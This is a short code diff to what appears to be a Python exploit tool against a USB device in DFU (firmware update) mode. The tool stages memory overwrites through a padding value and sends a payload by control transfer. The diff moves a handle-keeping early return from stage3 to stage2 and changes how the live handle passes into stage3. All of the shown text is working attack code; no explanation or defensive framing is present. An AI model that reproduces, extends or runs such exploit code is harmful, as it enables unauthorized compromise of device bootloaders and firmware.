@@ -792,6 +792,8 @@ def stage2(usb, out_spin_us, padding, debug, live_handle=None):
                 'the overwrite would land at the wrong offset. This attempt '
                 'does not count: re-enter DFU and retry the same --padding.'
                 % (info[1], remainder, padding, padding + 0x40))
+    if getattr(stage2, 'keep_handle', False):
+        return handle
     reset_and_release(usb, handle, settle=0.5)
 
 
@@ -873,8 +875,6 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None,
         rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
         if debug:
             print('    [debug] payload OUT        ctrl rc=%d' % rc)
-    if getattr(stage2, 'keep_handle', False):
-        return handle
     reset_and_release(usb, handle, settle=0.5)
 
 
@@ -974,7 +974,8 @@ def exploit(args):
         stage2.poison_append = bool(getattr(args, 'poison_append', False))
         live2 = stage2(usb, args.out_spin_us, args.padding, args.debug,
                        live_handle=live)
-        live = live2 if live is not None else live
+        if live2 is not None:
+            live = live2
     if args.stage in ('all', '3'):
         stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3.wipe = int(getattr(args, 'stage3_wipe', 0))
